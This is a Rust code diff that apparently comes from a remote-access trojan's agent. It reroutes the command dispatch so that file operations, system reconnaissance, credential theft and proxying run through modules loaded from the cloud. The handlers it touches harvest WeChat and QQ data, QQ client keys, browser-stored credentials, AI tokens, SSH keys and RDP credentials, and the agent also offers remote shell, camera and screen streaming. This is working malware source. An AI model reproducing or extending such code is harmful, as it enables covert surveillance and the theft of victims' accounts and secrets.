@@ -5,7 +5,7 @@ use libra_platform::get_executor;
 use super::AgentEngine;
 use super::shell::{ShellSession, bind_shell, handle_shell_input, unbind_shell};
 use super::streams::{start_camera_stream, start_screen_stream};
-use super::utils::{blocking_string, blocking_val, data_str, data_u64, ws_send};
+use super::utils::{blocking_string, blocking_val, data_str, data_u64, run_module, ws_send};
 
 impl AgentEngine {
     // ── WS message dispatch ──────────────────────────────────────────
@@ -16,6 +16,7 @@ impl AgentEngine {
         tx: &WsSender,
         shell_tx: &tokio::sync::mpsc::UnboundedSender<WebSocketMessage>,
         shell_session: &mut Option<ShellSession>,
+        module_manager: &std::sync::Arc<tokio::sync::Mutex<crate::module_manager::ModuleManager>>,
     ) {
         let agent_id = self.agent_id.clone();
         let msg_type = msg.msg_type.clone();
@@ -35,7 +36,7 @@ impl AgentEngine {
                 handle_shell_input(shell_session, &data, shell_tx, &agent_id).await;
             }
 
-            // ── File operations ──────────────────────────────────
+            // ── File operations (cloud module) ────────────────────
             ws_type::FILE_DRIVES => {
                 let drives = blocking_val(|| {
                     let executor = get_executor();
@@ -51,59 +52,76 @@ impl AgentEngine {
                 let path = data_str(&data, "path", ".");
                 let offset = data_u64(&data, "offset", 0) as usize;
                 let limit = data_u64(&data, "limit", 200) as usize;
-                let r = blocking_string(move || {
-                    libra_modules::execution::FileOps::list_directory_paged(&path, offset, limit)
-                })
-                .await;
+                let r = run_module(module_manager, "files", serde_json::json!({
+                    "op": "list", "path": path, "offset": offset, "limit": limit
+                })).await;
                 ws_send(tx, &agent_id, "file.list.result", &r, rid).await;
             }
             ws_type::FILE_READ => {
                 let path = data_str(&data, "path", "");
-                let r = blocking_string(move || libra_modules::execution::FileOps::read_file(&path)).await;
+                let r = run_module(module_manager, "files", serde_json::json!({
+                    "op": "read", "path": path
+                })).await;
                 ws_send(tx, &agent_id, "file.read.result", &r, rid).await;
             }
             ws_type::FILE_OPEN => {
                 let path = data_str(&data, "path", "");
-                let r = blocking_string(move || libra_modules::execution::FileOps::open_file(&path)).await;
+                let r = run_module(module_manager, "files", serde_json::json!({
+                    "op": "open", "path": path
+                })).await;
                 ws_send(tx, &agent_id, "file.open.result", &r, rid).await;
             }
             ws_type::FILE_WRITE => {
                 let path = data_str(&data, "path", "");
                 let content = data_str(&data, "data", "");
-                let r = blocking_string(move || libra_modules::execution::FileOps::write_file(&path, &content)).await;
+                let r = run_module(module_manager, "files", serde_json::json!({
+                    "op": "write", "path": path, "data": content
+                })).await;
                 ws_send(tx, &agent_id, "file.write.result", &r, rid).await;
             }
             ws_type::FILE_DELETE => {
                 let path = data_str(&data, "path", "");
-                let r = blocking_string(move || libra_modules::execution::FileOps::delete(&path)).await;
+                let r = run_module(module_manager, "files", serde_json::json!({
+                    "op": "delete", "path": path
+                })).await;
                 ws_send(tx, &agent_id, "file.delete.result", &r, rid).await;
             }
             ws_type::FILE_MKDIR => {
                 let path = data_str(&data, "path", "");
-                let r = blocking_string(move || libra_modules::execution::FileOps::create_directory(&path)).await;
+                let r = run_module(module_manager, "files", serde_json::json!({
+                    "op": "mkdir", "path": path
+                })).await;
                 ws_send(tx, &agent_id, "file.mkdir.result", &r, rid).await;
             }
             ws_type::FILE_RENAME => {
                 let path = data_str(&data, "path", "");
                 let new_name = data_str(&data, "newName", "");
-                let r = blocking_string(move || libra_modules::execution::FileOps::rename(&path, &new_name)).await;
+                let r = run_module(module_manager, "files", serde_json::json!({
+                    "op": "rename", "path": path, "newName": new_name
+                })).await;
                 ws_send(tx, &agent_id, "file.rename.result", &r, rid).await;
             }
             ws_type::FILE_MOVE => {
                 let src = data_str(&data, "source", "");
                 let dst = data_str(&data, "destination", "");
-                let r = blocking_string(move || libra_modules::execution::FileOps::move_path(&src, &dst)).await;
+                let r = run_module(module_manager, "files", serde_json::json!({
+                    "op": "move", "path": src, "destination": dst
+                })).await;
                 ws_send(tx, &agent_id, "file.move.result", &r, rid).await;
             }
             ws_type::FILE_COPY => {
                 let src = data_str(&data, "source", "");
                 let dst = data_str(&data, "destination", "");
-                let r = blocking_string(move || libra_modules::execution::FileOps::copy(&src, &dst)).await;
+                let r = run_module(module_manager, "files", serde_json::json!({
+                    "op": "copy", "path": src, "destination": dst
+                })).await;
                 ws_send(tx, &agent_id, "file.copy.result", &r, rid).await;
             }
             ws_type::FILE_COMPRESS => {
                 let path = data_str(&data, "path", "");
-                let r = blocking_string(move || libra_modules::execution::FileOps::compress(&path)).await;
+                let r = run_module(module_manager, "files", serde_json::json!({
+                    "op": "compress", "path": path
+                })).await;
                 ws_send(tx, &agent_id, "file.compress.result", &r, rid).await;
             }
             ws_type::FILE_DECOMPRESS => {
@@ -111,31 +129,43 @@ impl AgentEngine {
                 let dest: Option<String> = data.as_ref()
                     .and_then(|d| d["destination"].as_str())
                     .map(|s| s.to_string());
-                let r = blocking_string(move || libra_modules::execution::FileOps::decompress(&path, dest.as_deref())).await;
+                let r = run_module(module_manager, "files", serde_json::json!({
+                    "op": "decompress", "path": path, "destination": dest
+                })).await;
                 ws_send(tx, &agent_id, "file.decompress.result", &r, rid).await;
             }
             ws_type::FILE_SHORTCUT => {
                 let path = data_str(&data, "path", "");
-                let r = blocking_string(move || libra_modules::execution::FileOps::create_shortcut(&path)).await;
+                let r = run_module(module_manager, "files", serde_json::json!({
+                    "op": "shortcut", "path": path
+                })).await;
                 ws_send(tx, &agent_id, "file.shortcut.result", &r, rid).await;
             }
             ws_type::FILE_ARCHIVE_LIST => {
                 let path = data_str(&data, "path", "");
-                let r = blocking_string(move || libra_modules::execution::FileOps::list_archive(&path)).await;
+                let r = run_module(module_manager, "files", serde_json::json!({
+                    "op": "archive_list", "path": path
+                })).await;
                 ws_send(tx, &agent_id, "file.archive_list.result", &r, rid).await;
             }
 
-            // ── System info ──────────────────────────────────────
+            // ── System info (cloud recon module; network stays kernel-resident) ──
             ws_type::SYSTEM_PROCESSES => {
-                let r = blocking_string(move || libra_modules::recon::ProcessInfo::collect(None)).await;
+                let r = run_module(module_manager, "recon", serde_json::json!({
+                    "op": "processes"
+                })).await;
                 ws_send(tx, &agent_id, "system.processes.result", &r, rid).await;
             }
             ws_type::SYSTEM_WINDOWS => {
-                let r = blocking_string(move || libra_modules::recon::WindowInfo::collect()).await;
+                let r = run_module(module_manager, "recon", serde_json::json!({
+                    "op": "windows"
+                })).await;
                 ws_send(tx, &agent_id, "system.windows.result", &r, rid).await;
             }
             ws_type::SYSTEM_ENV => {
-                let r = blocking_string(move || libra_modules::recon::EnvInfo::collect()).await;
+                let r = run_module(module_manager, "recon", serde_json::json!({
+                    "op": "env"
+                })).await;
                 ws_send(tx, &agent_id, "system.env.result", &r, rid).await;
             }
             ws_type::SYSTEM_NETWORK => {
@@ -159,62 +189,82 @@ impl AgentEngine {
                 ws_send(tx, &agent_id, "system.network.proxy.result", &r, rid).await;
             }
             ws_type::SYSTEM_LANSCAN => {
-                let r = libra_modules::recon::LanScan::scan().await;
+                let r = run_module(module_manager, "recon", serde_json::json!({
+                    "op": "lanscan"
+                })).await;
                 ws_send(tx, &agent_id, "system.lanscan.result", &r, rid).await;
             }
             ws_type::SYSTEM_BLUETOOTH => {
-                let r = libra_modules::recon::BluetoothScanner::scan().await;
+                let r = run_module(module_manager, "recon", serde_json::json!({
+                    "op": "bluetooth"
+                })).await;
                 ws_send(tx, &agent_id, "system.bluetooth.result", &r, rid).await;
             }
 
-            // ── Other software ────────────────────────────────────
+            // ── Other software (cloud creds module) ────────────────
             ws_type::OTHERSOFT_WECHAT => {
-                let r = libra_modules::recon::OtherSoftware::collect_wechat();
+                let r = run_module(module_manager, "creds", serde_json::json!({
+                    "op": "wechat"
+                })).await;
                 ws_send(tx, &agent_id, "othersoft.wechat.result", &r, rid).await;
             }
             ws_type::OTHERSOFT_QQ => {
-                let r = libra_modules::recon::OtherSoftware::collect_qq();
+                let r = run_module(module_manager, "creds", serde_json::json!({
+                    "op": "qq"
+                })).await;
                 ws_send(tx, &agent_id, "othersoft.qq.result", &r, rid).await;
             }
             ws_type::OTHERSOFT_BROWSER => {
                 let btype = data_str(&data, "type", "all");
                 let offset = data_u64(&data, "offset", 0) as usize;
                 let limit = data_u64(&data, "limit", 100) as usize;
-                let r = libra_modules::recon::BrowserStealer::collect(&btype, offset, limit);
+                let r = run_module(module_manager, "creds", serde_json::json!({
+                    "op": "browser", "type": btype, "offset": offset, "limit": limit
+                })).await;
                 ws_send(tx, &agent_id, "othersoft.browser.result", &r, rid).await;
             }
             ws_type::OTHERSOFT_BROWSER_SEARCH => {
                 let btype = data_str(&data, "type", "all");
                 let keyword = data_str(&data, "keyword", "");
-                let r = libra_modules::recon::BrowserStealer::search(&btype, &keyword);
+                let r = run_module(module_manager, "creds", serde_json::json!({
+                    "op": "browser_search", "type": btype, "keyword": keyword
+                })).await;
                 ws_send(tx, &agent_id, "othersoft.browser.search.result", &r, rid).await;
             }
             ws_type::OTHERSOFT_AI => {
-                let r = libra_modules::recon::AITokenScanner::scan();
+                let r = run_module(module_manager, "creds", serde_json::json!({
+                    "op": "ai"
+                })).await;
                 ws_send(tx, &agent_id, "othersoft.ai.result", &r, rid).await;
             }
             ws_type::OTHERSOFT_SSH => {
-                let r = libra_modules::recon::SshKeys::collect();
+                let r = run_module(module_manager, "creds", serde_json::json!({
+                    "op": "ssh"
+                })).await;
                 ws_send(tx, &agent_id, "othersoft.ssh.result", &r, rid).await;
             }
             ws_type::OTHERSOFT_RDP => {
-                let r = libra_modules::recon::RdpCreds::collect();
+                let r = run_module(module_manager, "creds", serde_json::json!({
+                    "op": "rdp"
+                })).await;
                 ws_send(tx, &agent_id, "othersoft.rdp.result", &r, rid).await;
             }
             ws_type::OTHERSOFT_QQ_CLIENTKEY => {
-                let r = libra_modules::recon::QQClientKey::collect().await;
+                let r = run_module(module_manager, "creds", serde_json::json!({
+                    "op": "qq_clientkey"
+                })).await;
                 ws_send(tx, &agent_id, "othersoft.qq_clientkey.result", &r, rid).await;
             }
 
-            // ── Proxy ─────────────────────────────────────────────
+            // ── Proxy (cloud module) ─────────────────────────────
             ws_type::PROXY_FETCH => {
                 let url = data_str(&data, "url", "");
                 let method = data_str(&data, "method", "GET");
                 let headers = data.as_ref().and_then(|d| d["headers"].as_str());
                 let body = data.as_ref().and_then(|d| d["body"].as_str());
-                let r = libra_modules::execution::ProxyBrowser::fetch(
-                    &url, &method, headers, body,
-                ).await;
+                let r = run_module(module_manager, "proxy", serde_json::json!({
+                    "url": url, "method": method, "headers": headers, "body": body
+                })).await;
                 ws_send(tx, &agent_id, "proxy.fetch.result", &r, rid).await;
             }
 
